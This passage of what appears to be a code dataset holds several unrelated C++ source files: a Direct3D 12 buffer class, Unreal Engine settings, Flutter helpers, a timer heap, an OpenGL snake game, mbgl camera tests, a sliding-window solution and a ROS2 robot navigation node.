{\n        return curr_state_;\n    }\n\n    void GpuBuffer::Transition(GpuCommandList& cmd_list, D3D12_RESOURCE_STATES target_state)\n    {\n        D3D12_RESOURCE_BARRIER barrier;\n        if (curr_state_ != target_state)\n        {\n            barrier.Type = D3D12_RESOURCE_BARRIER_TYPE_TRANSITION;\n            barrier.Flags = D3D12_RESOURCE_BARRIER_FLAG_NONE;\n            barrier.Transition.pResource = resource_.get();\n            barrier.Transition.StateBefore = curr_state_;\n            barrier.Transition.StateAfter = target_state;\n            barrier.Transition.Subresource = D3D12_RESOURCE_BARRIER_ALL_SUBRESOURCES;\n            cmd_list.Transition(std::span(&barrier, 1));\n        }\n        else if ((target_state == D3D12_RESOURCE_STATE_UNORDERED_ACCESS) ||\n                 (target_state == D3D12_RESOURCE_STATE_RAYTRACING_ACCELERATION_STRUCTURE))\n        {\n            barrier.Type = D3D12_RESOURCE_BARRIER_TYPE_UAV;\n            barrier.Flags = D3D12_RESOURCE_BARRIER_FLAG_NONE;\n            barrier.UAV.pResource = resource_.get();\n            cmd_list.Transition(std::span(&barrier, 1));\n        }\n\n        curr_state_ = target_state;\n    }\n\n\n    GpuUploadBuffer::GpuUploadBuffer() noexcept = default;\n\n    GpuUploadBuffer::GpuUploadBuffer(GpuSystem& gpu_system, uint32_t size, std::wstring_view name)\n        : GpuBuffer(gpu_system, size, D3D12_HEAP_TYPE_UPLOAD, D3D12_RESOURCE_FLAG_NONE, D3D12_RESOURCE_STATE_COMMON, std::move(name)),\n          mapped_data_(this->Map())\n    {\n    }\n\n    GpuUploadBuffer::GpuUploadBuffer(GpuSystem& gpu_system, const void* data, uint32_t ",
    "\ufeff// Fill out your copyright notice in the Description page of Project Settings.\n\n\n#include \"CustomActorColorationSettings.h\"\n\nvoid UCustomActorColorationSettings::FillCollisionPresetColorMap()\n{\n\tTArray<TSharedPtr<FName>> ProfileNames;\n\tUCollisionProfile::Get()->GetProfileNames(ProfileNames);\n\n\t// remove\n\tTArray<FName> RemoveItems;\n\tfor (auto& CollisionPresetColorItem : CollisionPresetColorMap)\n\t{\n\t\tconst bool bIsFound = ProfileNames.ContainsByPredicate([&](const TSharedPtr<FName>& ProfileName)\n\t\t{\n\t\t\treturn *ProfileName == CollisionPresetColorItem.Key;\n\t\t});\n\t\tif(!bIsFound)\n\t\t{\n\t\t\tRemoveItems.Add(CollisionPresetColorItem.Key);\n\t\t}\n\t}\n\tfor (auto& RemoveItem : RemoveItems)\n\t{\n\t\tCollisionPresetColorMap.Remove(RemoveItem);\n\t}\n\t\n\t// add\n\tfor (TSharedPtr<FName> ProfileName : ProfileNames)\n\t{\n\t\tif(!CollisionPresetColorMap.Contains(*ProfileName))\n\t\t{\n\t\t\tCollisionPresetColorMap.Add(*ProfileName, FLinearColor::White);\n\t\t}\n\t}\n}\n\nUCustomActorColorationSettings::UCustomActorColorationSettings(const FObjectInitializer& ObjectInitializer)\n\t: Super(ObjectInitializer)\n{\n\tFillCollisionPresetColorMap();\n}\n\n#if WITH_EDITOR\nvoid UCustomActorColorationSettings::PostEditChangeProperty(FPropertyChangedEvent& PropertyChangedEvent)\n{\n\tSuper::PostEditChangeProperty(PropertyChangedEvent);\n\n\tFillCollisionPresetColorMap();\n}\n#endif",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  unsigned int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length == 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "//\n// Created by pyq on 5/7/24.\n//\n#include \"timer.h\"\n\nTimer::Timer() {\n  heap_.reserve(64);\n}\n\nTimer::~Timer() {\n    Clear();\n}\n\nvoid Timer::Adjust(int id, int timeOut) {\n    if (!heap_.empty() && ref_.count(id) > 0) {\n        size_t i = ref_[id];\n        auto oldExpires = heap_[i].expires;\n        auto newExpires = HighResolutionClock::now() + Milliseconds(timeOut);\n        heap_[i].expires = newExpires;\n        // do sift function depends on the new expires and old expires\n        if (newExpires < oldExpires) {\n            SiftUp_(i);\n        } else if (newExpires > oldExpires) {\n            SiftDown_(i, heap_.size());\n        }\n    }\n}\n\nvoid Timer::Add(int id, int timeOut, const TimeoutCallBack& cb) {\n    assert(id > 0);\n    size_t i;\n    if (ref_.count(id) == 0) {\n        // push back the new node and shift up\n        i = heap_.size();\n        ref_[id] = i;\n        heap_.push_back({id, HighResolutionClock::now() + Milliseconds(timeOut), cb});\n        SiftUp_(i);\n    } else {\n        // update the node\n        i = ref_[id];\n        auto oldExpires = heap_[i].expires;\n        auto newExpires = HighResolutionClock::now() + Milliseconds(timeOut);\n        heap_[i].expires = newExpires;\n        heap_[i].cb = cb;\n        // do sift function depends on the new expires and old expires\n        if (newExpires < oldExpires) {\n            SiftUp_(i);\n        } else if (newExpires > oldExpires) {\n            SiftDown_(i, heap_.size());\n        }\n    }\n}\n\nvoid Timer::DoWork(int id) {\n    if (heap_.empty() || ref_.count(id) == 0) {\n        return;\n    }\n    size_t i = ref_[id];\n    TimerNode node = heap_[i];\n    node.cb();\n    Delete_(i);\n}\n\nvoid Timer::Tick() {\n    while (!heap_.empty()) {\n        TimerNode node = heap_.front();\n        // Check the whether timernode is out of date\n        if (std::chrono::duration_cast<Milliseconds>(node.expires - HighResolutionClock::now()).count() > 0) {\n            break;\n        }\n        node.cb();\n        Pop();\n    }\n}\n\nint Timer::GetNextTick() {\n    Tick();\n    int res = -1;\n    if (!heap_.empty()) {\n        res = std::chrono::duration_cast<Milliseconds>(heap_.front().expires - HighResolutionClock::now()).count();\n        if (res < 0) {\n            res = 0;\n        }\n    }\n    return res;\n}\n\nvoid Timer::Pop() {\n    if (!heap_.empty()) {\n        Delete_(0);\n    }\n}\n\nvoid Timer::Clear() {\n    ref_.clear();\n    heap_.clear();\n}\n\nvoid Timer::Delete_(size_t i) {\n    assert(!heap_.empty() && i >= 0 && i < heap_.size());\n    size_t n = heap_.size() - 1;\n    if (i < n) {\n        // swap the target node and last node, delete the last node and sift\n        TimerNode node = heap_[i];\n        SwapNode_(i, n);\n        if (heap_[i] < node) {\n            SiftUp_(i);\n        } else {\n            SiftDown_(i, n);\n        }\n    }\n    ref_.erase(heap_.back().id);\n    heap_.pop_back();\n}\n\nvoid Timer::SwapNode_(size_t i, size_t j) {\n    assert(i >= 0 && i < heap_.size());\n    assert(j >= 0 && j < heap_.size());\n    std::swap(heap_[i], heap_[j]);\n    // Update the ref_ because the content of the same index has changed\n    ref_[heap_[i].id] = i;\n    ref_[heap_[j].id] = j;\n}\n\nvoid Timer::SiftUp_(size_t i) {\n    assert(i >= 0 && i < heap_.size());\n    // Calculate the index of the parent node\n    while (i > 0) {\n        size_t j = (i - 1) / 2;\n        if (heap_[j] < heap_[i]) {\n            break;\n        }\n        // Swap the nodes while value of parent node is bigger\n        SwapNode_(i, j);\n        i = j;\n    }\n}\n\n// n is the upper limit of adjusting the index\nvoid Timer::SiftDown_(size_t i, size_t n) {\n    assert(i >= 0 && i < heap_.size());\n    assert(n >= 0 && n <= heap_.size());\n    // Calculate the index of the left child node\n    size_t j = i * 2 + 1;\n    while(j < n) {\n        if(j + 1 < n && heap_[j + 1] < heap_[j]) {\n            j++;\n        }\n        if(heap_[i] < heap_[j]) {\n            break;\n        }\n        // Swap the nodes while value of parent node is bigger\n        SwapNode_(i, j);\n        i = j;\n        j = i * 2 + 1;\n    }\n}\n\n",
    "#include \"openGLPart.h\"\nvoid bunny(double size, Point loc) {\n    glPushMatrix();\n    glTranslatef(loc.x, loc.y, loc.z);\n    glScalef(size, size, size);\n    glBegin(GL_TRIANGLES);\n    for (int i = 0; i < faces.size();i += 3) {\n        glVertex3f(vertices[3 * faces[i]], vertices[3 * faces[i] + 1], vertices[3 * faces[i] + 2]);\n        glVertex3f(vertices[3 * faces[i + 1]], vertices[3 * faces[i + 1] + 1], vertices[3 * faces[i + 1] + 2]);\n        glVertex3f(vertices[3 * faces[i + 2]], vertices[3 * faces[i + 2] + 1], vertices[3 * faces[i + 2] + 2]);\n    }\n    glEnd();\n    glPopMatrix();\n}\n\nPoint randomBunnyLocation(int x, int y, int z, int max, int except) {\n    while (true) {\n        Point loc = { (x - 2 * DEFAULT_BUNNY_SIZE) * ((double)rand() / RAND_MAX - .5),\n            (y - 2 * DEFAULT_BUNNY_SIZE) * ((double)rand() / RAND_MAX - .5),\n            (z - 2 * DEFAULT_BUNNY_SIZE) * ((double)rand() / RAND_MAX - .5) };\n        bool acceptable = true;\n        for (int i = 0;i <= bodySegments - 1;i++) {\n            int current = (i + firstIndex) % MAX_SEGMENTS;\n            int next = (current + 1) % MAX_SEGMENTS;\n            Point p = diff(snakeBody[next], snakeBody[current]);\n            if (p.x != 0 && (loc.x - snakeBody[current].x) * (loc.x - snakeBody[next].x) <= 0 &&\n                (loc.y - snakeBody[current].y) * (loc.y - snakeBody[current].y)\n                + (loc.z - snakeBody[current].z) * (loc.z - snakeBody[current].z)\n                <= (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE) * (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE)) {\n                acceptable = false;\n                break;\n            }\n            if (p.y != 0 && (loc.y - snakeBody[current].y) * (loc.y - snakeBody[next].y) <= 0 &&\n                (loc.x - snakeBody[current].x) * (loc.x - snakeBody[current].x)\n                + (loc.z - snakeBody[current].z) * (loc.z - snakeBody[current].z)\n                <= (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE) * (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE)) {\n                acceptable = false;\n                break;\n            }\n            if (p.z != 0 && (loc.z - snakeBody[current].z) * (loc.z - snakeBody[next].z) <= 0 &&\n                (loc.x - snakeBody[current].x) * (loc.x - snakeBody[current].x)\n                + (loc.y - snakeBody[current].y) * (loc.y - snakeBody[current].y)\n                <= (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE) * (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE)) {\n                acceptable = false;\n                break;\n            }\n        }\n        if (!acceptable)\n            continue;\n        for (int i = 0;i <= bodySegments;i++) {\n            int current = (i + firstIndex) % MAX_SEGMENTS;\n            if ((snakeBody[current].x - loc.x) * (snakeBody[current].x - loc.x) +\n                (snakeBody[current].y - loc.y) * (snakeBody[current].y - loc.y) +\n                (snakeBody[current].z - loc.z) * (snakeBody[current].z - loc.z) <=\n                (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE) * (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE)) {\n                acceptable = false;\n                break;\n            }\n        }\n        if (!acceptable)\n            continue;\n        for (int i = 0;i < max;i++) {\n            if (i == except)\n                continue;\n            if (euclideanDistanceSquare(loc, bunnyLocation[i]) <= 4 * DEFAULT_BUNNY_SIZE * DEFAULT_BUNNY_SIZE) {\n                acceptable = false;\n                break;\n            }\n        }\n        if (acceptable)\n            return loc;\n    }\n}\nint eatsBunny() {\n    int head = (bodySegments + firstIndex) % MAX_SEGMENTS;\n    for (int i = 0; i < DEFAULT_NUMBER_OF_BUNNIES;i++)\n        if (euclideanDistanceSquare(snakeBody[head], bunnyLocation[i]) <= (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE) * (DEFAULT_THICKNESS + DEFAULT_BUNNY_SIZE))\n            return i;\n    return -1;\n}\nbool snakeCrossesItself() {\n    int head0 = (bodySegments + firstIndex - 1) % MAX_SEGMENTS;\n    int head1 = (head0 + 1) % MAX_SEGMENTS;\n    Point direction = diff(snakeBody[head1], snakeBody[head0]);\n    for (int i = 0;i <= bodySegments - 2;i++) {\n        int current = (i + firstIndex) % MAX_SEGMENTS;\n        int next = (current + 1) % MAX_SEGMENTS;\n        Point p = diff(snakeBody[next], snakeBody[current]);\n        if (direction.x == 0 && p.x == 0) {//on y-z plane\n            if (snakeBody[head0].x != snakeBody[current].x)\n                continue;\n            if (direction.y == 0 && p.y == 0) {\n                if (snakeBody[head0].y == snakeBody[current].y &&\n                    ((snakeBody[head0].z - snakeBody[current].z) * (snakeBody[head0].z - snakeBody[next].z) < 0 ||\n                        (snakeBody[head1].z - snakeBody[current].z) * (snakeBody[head1].z - snakeBody[next].z) < 0))\n                    return true;\n            }\n            if (direction.z == 0 && p.z == 0) {\n                if (snakeBody[head0].z == snakeBody[current].z &&\n                    ((snakeBody[head0].y - snakeBody[current].y) * (snakeBody[head0].y - snakeBody[next].y) < 0 ||\n    ",
    "#include <mbgl/test/util.hpp>\n\n#include <mbgl/map/camera.hpp>\n#include <mbgl/util/mat3.hpp>\n#include <mbgl/util/quaternion.hpp>\n\n#include <gmock/gmock.h>\n\nusing namespace mbgl;\n\nstatic const double abs_double_error = 1e-7;\n\nMATCHER_P(Vec3NearEquals, vec, \"\") {\n    return std::fabs(vec[0] - arg[0]) <= abs_double_error && std::fabs(vec[1] - arg[1]) <= abs_double_error &&\n           std::fabs(vec[2] - arg[2]) <= abs_double_error;\n}\n\nTEST(FreeCameraOptions, SetLocation) {\n    FreeCameraOptions options;\n\n    options.setLocation({{0.0, 0.0}, util::EARTH_RADIUS_M * M_PI});\n    ASSERT_TRUE(options.position);\n    ASSERT_THAT(options.position.value(), Vec3NearEquals(vec3{{0.5, 0.5, 0.5}}));\n\n    options.setLocation({{25.0, -180.0}, 1000.0});\n    ASSERT_TRUE(options.position);\n    ASSERT_THAT(options.position.value(), Vec3NearEquals(vec3{{0.0, 0.4282409625, 0.000027532812465}}));\n\n    options.setLocation(\n        {{util::LATITUDE_MAX, 0.0}, util::EARTH_RADIUS_M * M_PI * std::cos(util::LATITUDE_MAX * util::DEG2RAD)});\n    ASSERT_TRUE(options.position);\n    ASSERT_THAT(options.position.value(), Vec3NearEquals(vec3{{0.5, 0.0, 0.5}}));\n\n    options.setLocation(\n        {{-util::LATITUDE_MAX, 0.0}, util::EARTH_RADIUS_M * M_PI * std::cos(-util::LATITUDE_MAX * util::DEG2RAD)});\n    ASSERT_TRUE(options.position);\n    ASSERT_THAT(options.position.value(), Vec3NearEquals(vec3{{0.5, 1.0, 0.5}}));\n}\n\nTEST(FreeCameraOptions, SetLocationNegativeAltitude) {\n    FreeCameraOptions options;\n    options.setLocation({{0.0, 0.0}, -100.0});\n    ASSERT_TRUE(options.position);\n    ASSERT_DOUBLE_EQ(options.position.value()[2], -100.0 / util::M2PI / util::EARTH_RADIUS_M);\n}\n\nTEST(FreeCameraOptions, SetLocationUnwrappedLocation) {\n    FreeCameraOptions options;\n\n    options.setLocation({{0.0, -540.0}, 0.0});\n    ASSERT_TRUE(options.position);\n    ASSERT_THAT(options.position.value(), Vec3NearEquals(vec3{{-1.0, 0.5, 0.0}}));\n}\n\nTEST(FreeCameraOptions, GetLocation) {\n    FreeCameraOptions options;\n    LatLngAltitude latLngAltitude;\n\n    options.position = vec3{{0.5, 0.5, 0.5}};\n    ASSERT_TRUE(options.getLocation());\n    latLngAltitude = options.getLocation().value();\n    ASSERT_DOUBLE_EQ(latLngAltitude.location.latitude(), 0.0);\n    ASSERT_DOUBLE_EQ(latLngAltitude.location.longitude(), 0.0);\n    ASSERT_DOUBLE_EQ(latLngAltitude.altitude, 20037508.342789244);\n\n    options.position = vec3{{0.0, 0.4282409625, 0.000027532812465}};\n    ASSERT_TRUE(options.getLocation());\n    latLngAltitude = options.getLocation().value();\n    ASSERT_NEAR(latLngAltitude.location.latitude(), 25.0, 1e-7);\n    ASSERT_NEAR(latLngAltitude.location.longitude(), -180.0, 1e-7);\n    ASSERT_NEAR(latLngAltitude.altitude, 1000.0, 1e-7);\n\n    options.position = vec3{{0.5, 0.0, 0.5}};\n    ASSERT_TRUE(options.getLocation());\n    latLngAltitude = options.getLocation().value();\n    ASSERT_NEAR(latLngAltitude.location.latitude(), util::LATITUDE_MAX, 1e-7);\n    ASSERT_NEAR(latLngAltitude.location.longitude(), 0.0, 1e-7);\n    ASSERT_NEAR(latLngAltitude.altitude, 1728570.489074, 1e-6);\n}\n\nTEST(FreeCameraOptions, GetLocationInvalidPosition) {\n    FreeCameraOptions options;\n    // Mercator position not set. Should return nothing\n    ASSERT_FALSE(options.getLocation());\n\n    // Invalid latitude\n    options.position = vec3{{0.0, -0.1, 0.0}};\n    ASSERT_FALSE(options.getLocation());\n    options.position = vec3{{0.0, 2.0, 0.0}};\n    ASSERT_FALSE(options.getLocation());\n}\n\nTEST(FreeCameraOptions, GetLocationNegativeAltitude) {\n    FreeCameraOptions options;\n    options.position = vec3{{0.5, 0.5, -0.25}};\n    const auto latLngAltitude = options.getLocation();\n    ASSERT_TRUE(latLngAltitude);\n\n    ASSERT_DOUBLE_EQ(latLngAltitude->altitude, -0.5 * util::EARTH_RADIUS_M * M_PI);\n}\n\nTEST(FreeCameraOptions, GetLocationUnwrappedPosition) {\n    FreeCameraOptions options;\n    options.position = vec3{{1.25, 0.5, 0.0}};\n    const auto latLngAltitude = options.getLocation();\n    ASSERT_TRUE(latLngAltitude);\n    ASSERT_DOUBLE_EQ(latLngAltitude->location.longitude(), 270.0);\n    ASSERT_DOUBLE_EQ(latLngAltitude->location.latitude(), 0.0);\n    ASSERT_DOUBLE_EQ(latLngAltitude->altitude, 0.0);\n}\n\nstatic std::tuple<vec3, vec3, vec3> rotatedFrame(const std::array<double, 4>& quaternion) {\n    Quaternion q(quaternion);\n    return std::make_tuple(\n        q.transform({{1.0, 0.0, 0.0}}), q.transform({{0.0, -1.0, 0.0}}), q.transform({{0.0, 0.0, -1.0}}));\n}\n\nTEST(FreeCameraOptions, LookAtPoint) {\n    FreeCameraOptions options;\n    vec3 right, up, forward;\n    const double cosPi4 = 1.0 / std::sqrt(2.0);\n\n    // Pitch: 45, bearing: 0\n    options.position = vec3{{0.5, 0.5, 0.5}};\n    options.lookAtPoint({util::LATITUDE_MAX, 0.0});\n    ASSERT_TRUE(options.orientation);\n    std::tie(right, up, forward) = rotatedFrame(options.orientation.value());\n\n    ASSERT_THAT(right, Vec3NearEquals(vec3{{1.0, 0.0, 0.0}}));\n    ASSERT_THAT(up, Vec3NearEquals(vec3{{0.0, -cosPi4, cosPi4}}));\n    ASSERT_THAT(forward, Vec3NearEquals(vec3{{0.0, -",
    "#include <iostream>\r\n#include <deque>\r\n#include <vector>\r\nusing namespace std;\r\n\r\nint main(){\r\n    ios::sync_with_stdio(false);\r\n    cin.tie(NULL); cout.tie(NULL);\r\n    int n,m,c,input;\r\n    deque <int> dq[2];//\uac12\uc774 \uc544\ub2cc \uc778\ub371\uc2a4\ub97c \uc800\uc7a5\r\n    vector <int> vt, max, min, ans;//\uac12\uc744 \uc800\uc7a5, \ubc94\uc704 \ub0b4\uc758 \ucd5c\ub313\uac12\uc758 \uc778\ub371\uc2a4\ub97c \uc800\uc7a5\r\n    cin >> n >> m >> c;\r\n    for(int i = 0;i<n;i++){\r\n        cin >> input;\r\n        vt.push_back(input);\r\n    }\r\n    for(int i = 0;i<vt.size();i++){\r\n        while(!dq[0].empty() && vt[dq[0].back()] <= vt[i]) dq[0].pop_back();\r\n\r\n        while(!dq[1].empty() && vt[dq[1].back()] >= vt[i]) dq[1].pop_back();\r\n        \r\n        dq[0].push_back(i); dq[1].push_back(i);\r\n\r\n        if(dq[0].front() == i-m) dq[0].pop_front();\r\n        if(dq[1].front() == i-m) dq[1].pop_front();\r\n        \r\n        if(i >= m-1){\r\n            max.push_back(dq[0].front());\r\n            min.push_back(dq[1].front());\r\n        }\r\n    }\r\n    for(int i = 0;i<max.size();i++){\r\n        if(vt[max[i]] - vt[min[i]] <= c){\r\n            ans.push_back(i+1);\r\n        }\r\n    }\r\n    if(ans.empty()) cout << \"NONE\";\r\n    else{\r\n        for(int i = 0;i<ans.size();i++){\r\n            cout << ans[i] << '\\n';\r\n        }\r\n    }\r\n}\r\n/*\ubb38\uc81c \ucf54\ub4dc \ub2f5\uc744 \ubcf8 \uac74 \uc544\ub2c8\uc9c0\ub9cc \uc0ac\uc2e4\uc0c1 \ubcf8 \uac70\ub098 \ub2e4\ub984 \uc5c6\uc74c.\r\n\r\n\uc774\ubc88 \ubb38\uc81c \ud480\uc774\ub85c \uc548 \uc54c\uace0\ub9ac\uc998: \r\n\uc2ac\ub77c\uc774\ub529 \uc708\ub3c4\uc6b0\ub97c \ud1b5\ud55c \ub371\uc744 \uc774\uc6a9\ud55c \ucd5c\ub300 \ucd5c\uc18c \uac12 \uad6c\ud558\uae30 \uc54c\uace0\ub9ac\uc998\r\n\uc2ac\ub77c\uc774\ub529 \uc708\ub3c4\uc6b0\ub780 \ubc30\uc5f4\uc758 \uc5b4\ub290 \ubc94\uc704 \uc548\uc5d0\uc11c \ud55c \uce78\uc529 \uc774\ub3d9\ud558\uba74\uc11c \ubd80\ubd84\uc758 \uac12\uc744 \uc774\uc6a9\ud558\ub294 \uac83\r\n\r\n\ubcf4\ud1b5 \ubc30\uc5f4 \ub0b4\uc5d0\uc11c \ucd5c\ub300 \ucd5c\uc18c \uac12\uc744 \uad6c\ud560 \ub550 \ub2e8\uc21c\ud558\uac8c \ub5a0\uc624\ub974\ub294 \uac74 (\ube0c\ub8e8\ud2b8\ud3ec\uc2a4) \uc774\uc911 \ubc18\ubcf5\ubb38\uc774\ub2e4. \uc2dc\uac04 \ubcf5\uc7a1\ub3c4\ub294 O(N^2)\r\n\uad6c\ud604\uc740 \uac04\ub2e8\ud558\uc9c0\ub9cc \ub9ce\uc740 \uac12\uc744 \uc5f0\uc0b0\ud560 \uacbd\uc6b0 \uc2dc\uac04\ucd08\uacfc\ub418\uae30 \ub531 \uc88b\ub2e4.\r\n\r\n\uc790\uc138\ud55c \uac74 \uc54c\uace0\ub9ac\uc998 \ud3f4\ub354\uc5d0\uc11c \ucc38\uace0\r\n\r\n\ubb38\uc81c \uacfc\uc815\uc740 \uac04\ub2e8\ud558\ub2e4.\r\n1. \uc785\ub825\uac12\uc744 \ubca1\ud130\uc5d0 \ub2f4\ub294\ub2e4.\r\n2. \uc774\uc81c\ubd80\ud130 \ub371\uc744 \uc774\uc6a9\ud55c\ub2e4. \uc774\ub54c \ub371\uc5d0\ub294 \uc694\uc18c \uc790\uccb4\ub97c \ub2f4\uc9c0 \uc54a\uace0 \uc778\ub371\uc2a4\ub97c \ub2f4\ub294\ub2e4.**\r\n\ucd5c\ub300\uc640 \ucd5c\uc18c\ub97c \uad6c\ud574\uc57c\ud558\ubbc0\ub85c 2\uac1c\uc758 \ub371\uc744 \uc774\uc6a9\ud588\ub2e4.\r\n2-1. \uc778\ub371\uc2a4\ub97c \ucc28\uadfc \ucc28\uadfc \ub2f4\ub294\ub370, \uc774\ub54c \uc911\uc694\ud55c \uac74 front\uc5d0 \ucd5c\ub313\uac12\uc774 \ud56d\uc0c1 \uc874\uc7ac\ud574\uc57c \ud55c\ub2e4.\r\n\ub371\uc758 back()\uacfc vt[i]\ub97c \ube44\uad50\ud558\uc5ec \uc0c8\ub85c \ucd5c\ub313\uac12\uc774 \ubc1c\uacac\ub418\uba74 pop\ud55c\ub2e4.\r\n2-2. \uadf8\ub9ac\uace0 \uc708\ub3c4\uc6b0 \ubc94\uc704 \ubc16\uc758 \ucd5c\ub313\uac12\uc740 \ubc84\ub824\uc57c \ud558\ubbc0\ub85c i-m\uacfc front\uac00 \uac19\uc544\uc9c0\ub294, \uc989 \ubc94\uc704\ub97c \ubc97\uc5b4\ub09c \uc989\uc2dc \uc0ad\uc81c\ud55c\ub2e4.\r\n2-3. i >= m-1\uc758 \uc870\uac74\uc740 \ucc98\uc74c \uc2dc\uc791 \uc2dc \uc708\ub3c4\uc6b0\uac00 m\ub9cc\ud07c \ubc94\uc704\ub97c \uac00\uc9c8 \ub54c\ubd80\ud130 \uac12\uc744 \ubc18\ud658\uc2dc\ud0a8\ub2e4.\r\n*/\r\n",
    "#include <chrono>\n#include <geometry_msgs/msg/pose_stamped.hpp>\n#include <geometry_msgs/msg/pose_with_covariance_stamped.hpp>\n#include <iostream>\n#include <nav2_msgs/msg/behavior_tree_log.hpp>\n#include <nav2_msgs/msg/behavior_tree_status_change.hpp>\n#include <nav_msgs/msg/path.hpp>\n#include <rclcpp/rclcpp.hpp>\n#include <sensor_msgs/msg/laser_scan.hpp>\n#include <std_msgs/msg/int32.hpp>\n#include <thread>\n#include <vector>\n\n#include \"lifecycle_msgs/srv/change_state.hpp\"\n#define MAX 99999\n\n#include \"JunctionMonitor.h\"\n\nTCAS::JunctionMonitor obj;\nstd::vector<std::future<void>> results;\n\nrclcpp::Node::SharedPtr node = nullptr;\nstd::array<rclcpp::Publisher<geometry_msgs::msg::PoseStamped>::SharedPtr, MAX>\n    goal_pub;\n\nstd::vector<nav_msgs::msg::Path> initial_path(MAX);\nstd::vector<geometry_msgs::msg::PoseStamped> initial_goal(MAX);\n\nstd::vector<geometry_msgs::msg::PoseStamped> current_pose(MAX);\nstd::vector<geometry_msgs::msg::PoseStamped> previous_pose(MAX);\n\nstd::vector<std::string> goal_topics_;\n\nfloat offset[MAX];\nbool first_goal_path[MAX];\nbool first_goal[MAX];\n\nbool deactivateRobot[MAX];\nbool activateRobot[MAX];\n\nfloat front_dist[MAX], bottom_dist[MAX], left_dist[MAX], right_dist[MAX];\n\nvoid sendOffset(int robot_id) {\n  int i[MAX];\n  i[robot_id] = 0;\n  previous_pose[robot_id] = initial_path[robot_id].poses[0];\n\n  std::string goal_topic = goal_topics_[robot_id];\n\n  goal_pub[robot_id] =\n      node->create_publisher<geometry_msgs::msg::PoseStamped>(goal_topic, 10);\n\n  std::cout << initial_path[robot_id].poses.size() << std::endl;\n\n  for (const auto& pose_stamped : initial_path[robot_id].poses) {\n    i[robot_id] += 1;\n    if (i[robot_id] == 7) {\n      std::this_thread::sleep_for(std::chrono::seconds(1));\n\n      std::vector<geometry_msgs::msg::PoseStamped> modified_pose(MAX);\n      modified_pose[robot_id] = pose_stamped;\n      current_pose[robot_id] = modified_pose[robot_id];\n\n      float dx[MAX];\n      dx[robot_id] = previous_pose[robot_id].pose.position.x -\n                     current_pose[robot_id].pose.position.x;\n      float dy[MAX];\n      dy[robot_id] = previous_pose[robot_id].pose.position.y -\n                     current_pose[robot_id].pose.position.y;\n\n      if (dy[robot_id] <= 0.1 && dy[robot_id] >= -0.1) {\n        modified_pose[robot_id].pose.position.y += offset[robot_id];\n        if (dx[robot_id] > 0) {\n          offset[robot_id] = obj.robot_radius;\n          if (offset[robot_id] > left_dist[robot_id]) {\n            offset[robot_id] = -1 * (left_dist[robot_id] - 0.1);\n          }\n\n          else {\n            offset[robot_id] = -1 * offset[robot_id];\n          }\n\n          modified_pose[robot_id].pose.orientation.z = 1.0;\n        }\n\n        else if (dx[robot_id] < 0) {\n          offset[robot_id] = obj.robot_radius;\n          if (offset[robot_id] > left_dist[robot_id]) {\n            offset[robot_id] = (left_dist[robot_id] - 0.1);\n          }\n          modified_pose[robot_id].pose.orientation.z = 0.0;\n        }\n      }\n\n      else if (dx[robot_id] <= 0.1 && dx[robot_id] >= -0.1) {\n        modified_pose[robot_id].pose.position.x += offset[robot_id];\n        if (dy[robot_id] > 0) {\n          offset[robot_id] = obj.robot_radius;\n          if (offset[robot_id] > left_dist[robot_id]) {\n            offset[robot_id] = (left_dist[robot_id] - 0.1);\n          }\n          // modified_pose[robot_id].pose.orientation.z = 0.0;\n        }\n\n        else if (dy[robot_id] < 0) {\n          offset[robot_id] = obj.robot_radius;\n          if (offset[robot_id] > left_dist[robot_id]) {\n            offset[robot_id] = -1 * (left_dist[robot_id] - 0.1);\n          }\n\n          else {\n            offset[robot_id] = -1 * offset[robot_id];\n          }\n          // modified_pose[robot_id].pose.orientation.z = 1.0;\n        }\n      }\n\n      modified_pose[robot_id].header = initial_goal[robot_id].header;\n      goal_pub[robot_id]->publish(modified_pose[robot_id]);\n\n      i[robot_id] = 0;\n      previous_pose[robot_id] = current_pose[robot_id];\n    }\n  }\n\n  std::cout << \"Done\" << std::endl;\n  goal_pub[robot_id]->publish(initial_goal[robot_id]);\n}\n\nvoid getInitialPath(int robot_id, const nav_msgs::msg::Path::SharedPtr plan) {\n  if (!first_goal_path[robot_id]) {\n    initial_path[robot_id] = *plan;\n    first_goal_path[robot_id] = true;\n\n    results.push_back(std::async(std::launch::async, sendOffset, 